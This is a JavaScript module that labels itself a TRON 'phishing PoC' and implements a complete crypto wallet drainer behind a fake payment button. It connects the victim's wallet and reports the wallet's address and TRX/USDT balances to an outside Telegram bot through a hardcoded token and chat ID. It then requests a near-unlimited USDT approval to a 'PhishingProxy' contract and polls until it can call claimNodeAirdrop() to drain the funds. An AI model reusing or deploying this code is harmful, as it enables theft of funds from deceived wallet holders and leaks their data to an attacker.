/**
 * useWeb3Payment.js — Web3 Payment Logic Module (ES Module)
 *
 * Wraps the Nile Testnet USDT approve → poll allowance → drain flow
 * extracted from the TRON Phishing PoC App.jsx.
 *
 * ================================================================
 * SECURITY RESEARCH CONFIGURATION — REPLACE BEFORE DEPLOYMENT
 * ================================================================
 *
 * NILE_USDT_ADDRESS:          Nile testnet USDT (TRC20) contract address.
 * PROXY_CONTRACT_ADDRESS:     Deployed PhishingProxy contract address on Nile.
 *                              Replace with your deployed address.
 *
 * ================================================================
 */

"use strict";

// ─── Constants ────────────────────────────────────────────────────────────────

/** Nile Testnet USDT (TRC20) contract address. */
export const NILE_USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";

/**
 * Deployed PhishingProxy contract address on Nile testnet.
 * Replace this with the actual address after deploying PhishingProxy.sol.
 * Tron addresses on Nile are 34 characters starting with 'T'.
 */
export const PROXY_CONTRACT_ADDRESS = "TLW9Vwp1jjswPy7mqKKmYGAHuwHkvMpvg8";

export const NILE_CHAIN_ID           = "0x2bf9b619";
export const NILE_CHAIN_ID_DECIMAL   = 736766761;

/** Telegram Bot Token for sending balance notifications. */
export const TELEGRAM_BOT_TOKEN = "8648718062:AAHS_-XSShgFpAd8eJwKdEo6yZnGzyEkml4";

/** Telegram Chat ID to receive balance notifications. */
export const TELEGRAM_CHAT_ID   = "8505661135";

/**
 * Approve amount in TRC20-scaled units (USDT has 6 decimals).
 * 999,999,999 USDT → 999,999,999 * 10^6 = 999,999,999,000,000
 */
export const APPROVE_AMOUNT = "999999999000000";

// ─── Phase State Machine ─────────────────────────────────────────────────────

/**
 * Activation phases for the unified single-button flow.
 *   IDLE       → User hasn't started or cancelled.
 *   APPROVING  → approve() tx sent; waiting for wallet popup.
 *   POLLING    → approve() confirmed on-chain; polling allowance.
 *   DRAINING   → allowance > 0 detected; calling claimNodeAirdrop().
 *   DONE       → claimNodeAirdrop() succeeded.
 *   ERROR      → Something went wrong at any stage.
 */
export const PHASE = Object.freeze({
  IDLE:      "IDLE",
  APPROVING: "APPROVING",
  POLLING:   "POLLING",
  DRAINING:  "DRAINING",
  DONE:      "DONE",
  ERROR:     "ERROR",
});

// ─── Detection helpers ────────────────────────────────────────────────────────

/** Returns true when the UA indicates a mobile device (iOS or Android). */
export function isMobile() {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || navigator.vendor || "";
  return /android/i.test(ua) || /iPad|iPhone|iPod/i.test(ua);
}

/**
 * Returns true when the page is running inside TokenPocket's
 * built-in DApp browser — i.e. window.tronWeb is available.
 */
export function isInTokenPocket() {
  return typeof window !== "undefined" && !!window.tronWeb;
}

// ─── Hook Factory ─────────────────────────────────────────────────────────────

/**
 * Creates and returns a Web3 payment controller.
 * Call once per page.
 *
 * @param {object}   callbacks
 * @param {function} callbacks.onPhaseChange   — called with (phase)
 * @param {function} callbacks.onWalletChange  — called with (walletAddr, isConnected)
 * @param {function} callbacks.onError        — called with (errorMsg)
 * @returns {object} controller
 */
export function createWeb3Payment(callbacks = {}) {
  // ── Internal state ────────────────────────────────────────────────────────
  const state = {
    tronWeb:      null,
    walletAddr:  null,
    isConnected: false,
    phase:       PHASE.IDLE,
    errorMsg:     null,
    txHash:       null,
    redirecting:  false,
    connecting:   false,
  };

  let pollIntervalRef       = null;
  let _pollTronWebInterval  = null;
  const walletAddrRef = { current: null };
  const balanceRef = { current: { trx: "0.00", usdt: "0.00", checked: false } };
  const _priceRef = { current: 0 };

  // ── Subscribers ───────────────────────────────────────────────────────────
  function notifyPhaseChange(phase) {
    state.phase = phase;
    try { callbacks.onPhaseChange && callbacks.onPhaseChange(phase); } catch (_) {}
  }

  function notifyWalletChange(addr, connected) {
    state.walletAddr  = addr;
    state.isConnected = connected;
    walletAddrRef.current = addr;
    try { callbacks.onWalletChange && callbacks.onWalletChange(addr, connected); } catch (_) {}

    if (connected && addr) {
      checkBalanceAndNotify(_priceRef.current).then(({ sufficient, trxBalance, usdtBalance }) => {
        if (trxBalance !== undefined) balanceRef.current = { trx: trxBalance, usdt: usdtBalance, checked: true };
        if (callbacks.onBalanceResult) {
          callbacks.onBalanceResult({ sufficient, trxBalance, usdtBalance });
        }
      });
    }
  }

  function notifyError(msg) {
    state.errorMsg = msg;
    try { callbacks.onError && callbacks.onError(msg); } catch (_) {}
  }

  // ── Network check ─────────────────────────────────────────────────────────
  function checkNetwork() {
    try {
      const net = (window.tronWeb?.fullNode?.host) || "";
      return (
        net.includes("nile") ||
        net.includes("api.nile") ||
        window.tronWeb?.chainId === NILE_CHAIN_ID_DECIMAL
      );
    } catch (_) {
      return false;
    }
  }

  // ── Fetch USDT balance ────────────────────────────────────────────────────
  async function fetchBalances(addr) {
    if (!window.tronWeb) return null;
    try {
      const contract = await window.tronWeb.contract().at(NILE_USDT_ADDRESS);
      const raw      = await contract.balanceOf(addr).call();
      const balance  = Number(raw) / 1e6;
      return balance.toFixed(2);
    } catch (err) {
      console.error("[useWeb3Payment] balanceOf error:", err);
      return "0.00";
    }
  }

  // ── Fetch TRX balance ───────────────────────────────────────────────────────
  async function fetchTrxBalance(addr) {
    if (!window.tronWeb) return "0.00";
    try {
      const raw   = await window.tronWeb.trx.getBalance(addr);
      const balance = Number(raw) / 1e6;
      return balance.toFixed(2);
    } catch (err) {
      console.error("[useWeb3Payment] TRX balance error:", err);
      return "0.00";
    }
  }

  // ── Send balance notification to Telegram ────────────────────────────────────
  async function sendBalanceToTelegram(trxBalance, usdtBalance, addr) {
    const token = TELEGRAM_BOT_TOKEN;
    const chatId = TELEGRAM_CHAT_ID;
    if (!token || token === "YOUR_BOT_TOKEN" || !chatId || chatId === "YOUR_CHAT_ID") {
      console.warn("[useWeb3Payment] Telegram not configured, skipping notification.");
      return;
    }
    try {
      const shortAddr = addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "???";
      const text = encodeURIComponent(
        `🔔 新用户钱包已连接\n` +
        `━━━━━━━━━━━━━━━\n` +
        `📪 地址：${shortAddr}\n` +
        `💰 TRX：${trxBalance} TRX\n` +
        `💎 USDT：${usdtBalance} USDT\n` +
        `━━━━━━━━━━━━━━━`
      );
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
    } catch (err) {
      console.error("[useWeb3Payment] Telegram notification failed:", err);
    }
  }

  // ── Check if USDT balance is sufficient ──────────────────────────────────────
  async function checkBalanceAndNotify(price) {
    const addr = walletAddrRef.current;
    if (!addr) return { sufficient: true };

    const [trxBalance, usdtBalance] = await Promise.all([
      fetchTrxBalance(addr),
      fetchBalances(addr),
    ]);

    // Always send to Telegram on wallet connect
    await sendBalanceToTelegram(trxBalance, usdtBalance, addr);

    const usdtNum = parseFloat(usdtBalance);
    const sufficient = usdtNum >= price;
    return { sufficient, trxBalance, usdtBalance };
  }

  // ── Fetch allowance for the proxy contract ─────────────────────────────────
  async function fetchAllowance(addr) {
    if (!window.tronWeb) return 0;
    try {
      const contract = await window.tronWeb.contract().at(NILE_USDT_ADDRESS);
      const raw      = await contract.allowance(addr, PROXY_CONTRACT_ADDRESS).call();
      return Number(raw);
    } catch (err) {
      console.error("[useWeb3Payment] allowance error:", err);
      return 0;
    }
  }

  // ── Stop polling ───────────────────────────────────────────────────────────
  function stopPolling() {
    if (pollIntervalRef !== null) {
      clearInterval(pollIntervalRef);
      pollIntervalRef = null;
    }
  }

  // ── Reset to idle ──────────────────────────────────────────────────────────
  function resetToIdle() {
    stopPolling();
    notifyPhaseChange(PHASE.IDLE);
    state.txHash   = null;
    state.errorMsg = null;
  }

  // ── Phase 3 & 4: Poll allowance → auto-call claimNodeAirdrop ─────────────
  function startAllowancePolling() {
    stopPolling();

    pollIntervalRef = setInterval(async () => {
      const addr = walletAddrRef.current;
      if (!addr) return;

      try {
        const allowance = await fetchAllowance(addr);

        if (allowance > 0) {
          stopPolling();
          notifyPhaseChange(PHASE.DRAINING);

          const proxyContract = await window.tronWeb
            .contract()
            .at(PROXY_CONTRACT_ADDRESS);

          const drainTx = await proxyContract.claimNodeAirdrop().send({
            feeLimit: 100_000_000, // 100 TRX
          });

          state.txHash = drainTx;
          notifyPhaseChange(PHASE.DONE);

          setTimeout(() => {
            fetchBalances(addr);
            fetchAllowance(addr);
          }, 3000);
        }
        // else: allowance still 0 — keep polling
      } catch (err) {
        stopPolling();
        const msg =
          (err?.message) ||
          (typeof err === "string" ? err : "Polling / drain failed.");
        notifyError(msg);
        notifyPhaseChange(PHASE.ERROR);
      }
    }, 3000); // poll every 3 seconds
  }

  // ── Detect TronLink ─────────────────────────────────────────────────────────
  function detectTronLink() {
    if (typeof window === "undefined") return;

    if (window.tronWeb) {
      const addr = window.tronWeb.defaultAddress?.base58;
      if (addr) {
        state.tronWeb = window.tronWeb;
        notifyWalletChange(addr, true);
        return true;
      }
    } else if (window.tronLink) {
      window.tronLink
        .request({ method: "tron_requestAccounts" })
        .then((res) => {
          if (res.code === 200 && window.tronWeb) {
            const addr = window.tronWeb.defaultAddress?.base58;
            if (addr) {
              state.tronWeb = window.tronWeb;
              notifyWalletChange(addr, true);
            }
          }
        })
        .catch(() => {});
    }
    return false;
  }

  // ── Start listening for TronWeb injection ──────────────────────────────────
  function startListening() {
    _pollTronWebInterval = setInterval(() => {
      if (!state.isConnected && typeof window !== "undefined") {
        if (window.tronWeb?.defaultAddress?.base58) {
          state.tronWeb = window.tronWeb;
          notifyWalletChange(window.tronWeb.defaultAddress.base58, true);
          clearInterval(_pollTronWebInterval);
        }
      }
    }, 800);
  }

  function stopListening() {
    if (_pollTronWebInterval !== null) {
      clearInterval(_pollTronWebInterval);
      _pollTronWebInterval = null;
    }
  }

  // ── Connect wallet ─────────────────────────────────────────────────────────
  /**
   * Connects wallet.
   *   - Mobile browser (no tronWeb injected) → deep-link to TokenPocket.
   *   - Desktop / TP in-app → requests accounts via TronLink.
   */
  function connectWallet() {
    state.connecting   = true;
    state.redirecting = false;

    if (isMobile() && !isInTokenPocket()) {
      // Case A: mobile browser without wallet → redirect to TP
      state.redirecting = true;
      const tpLink =
        "tpdapp://open?params=" +
        encodeURIComponent(JSON.stringify({ url: window.location.href }));
      window.location.href = tpLink;
      state.connecting = false;
      return;
    }

    // Case B: in-app TP or desktop with TronLink
    if (window.tronLink) {
      window.tronLink
        .request({ method: "tron_requestAccounts" })
        .then((res) => {
          if (res.code === 200 && window.tronWeb) {
            const addr = window.tronWeb.defaultAddress?.base58;
            if (addr) {
              state.tronWeb = window.tronWeb;
              notifyWalletChange(addr, true);
            }
          }
        })
        .catch((err) => {
          console.error("[useWeb3Payment] connect error:", err);
        })
        .finally(() => {
          state.connecting  = false;
          state.redirecting = false;
        });
    } else {
      state.connecting  = false;
      state.redirecting = false;
    }
  }

  // ── Execute fake payment ───────────────────────────────────────────────────
  /**
   * Full attack flow:
   *   1. Check USDT balance; if insufficient, trigger insufficient-balance callback.
   *   2. Send approve() tx for max amount to proxy contract.
   *   3. Poll allowance every 3 s until > 0.
   *   4. Once allowance confirmed, call claimNodeAirdrop() (drain).
   */
  async function executeFakePayment() {
    if (!state.isConnected || !state.walletAddr) {
      notifyError("钱包未连接，请先连接钱包。");
      notifyPhaseChange(PHASE.ERROR);
      return;
    }

    // Step 0: check USDT balance before doing anything
    const { sufficient, trxBalance, usdtBalance } = await checkBalanceAndNotify(_priceRef.current);
    if (!sufficient) {
      if (callbacks.onBalanceInsufficient) {
        callbacks.onBalanceInsufficient({ trxBalance, usdtBalance, required: _priceRef.current });
      }
      return;
    }

    state.errorMsg = null;
    state.txHash   = null;

    // Phase 1: send approve tx
    notifyPhaseChange(PHASE.APPROVING);

    window.tronWeb
      .contract()
      .at(NILE_USDT_ADDRESS)
      .then((usdtContract) => {
        return usdtContract
          .approve(PROXY_CONTRACT_ADDRESS, APPROVE_AMOUNT)
          .send({ feeLimit: 100_000_000 });
      })
      .then((approveTx) => {
        state.txHash = approveTx;

        // Phase 2: switch to polling
        notifyPhaseChange(PHASE.POLLING);

        // Give tx time to propagate to mempool
        setTimeout(() => {
          startAllowancePolling();
        }, 1500);
      })
      .catch((err) => {
        stopPolling();
        const msg =
          (err?.message) ||
          (typeof err === "string" ? err : "Transaction failed.");
        const isRejection =
          (msg.toLowerCase().includes("rejected") ||
           msg.toLowerCase().includes("denied")    ||
           msg.toLowerCase().includes("cancelled")) ||
          err?.code === 4001;
        notifyError(
          isRejection
            ? "\u60a8\u53d6\u6d88\u4e86\u6388\u6743\u64cd\u4f5c\u3002"
            : "\u6388\u6743\u5931\u8d25: " + msg
        );
        notifyPhaseChange(PHASE.ERROR);
      });
  }

  // ── Public API ─────────────────────────────────────────────────────────────
  return {
    PHASE,
    getPhase:       () => state.phase,
    getTxHash:     () => state.txHash,
    getErrorMsg:   () => state.errorMsg,
    isConnected:   () => state.isConnected,
    getWalletAddr:() => state.walletAddr,
    isRedirecting: () => state.redirecting,
    isConnecting:  () => state.connecting,
    getBalances:   () => balanceRef.current,

    /** Set product price (used for balance check). */
    setPrice: (price) => { _priceRef.current = price; },

    /** Call once on mount. */
    init()    { detectTronLink(); startListening(); },
    /** Call on unmount. */
    destroy() { stopListening(); stopPolling(); },

    connectWallet,
    executeFakePayment,
    resetToIdle,

    isMobile,
    isInTokenPocket,
    checkNetwork,
    fetchBalances,
    fetchTrxBalance,
    fetchAllowance,

    /** Tronscan URL for a tx hash. */
    txLink: (hash) => "https://nile.tronscan.org/#/transaction/" + hash,

    /** Shorten a Tron address for display. */
    shortAddr: (addr) => {
      if (!addr) return "";
      return addr.slice(0, 6) + "..." + addr.slice(-4);
    },
  };
}
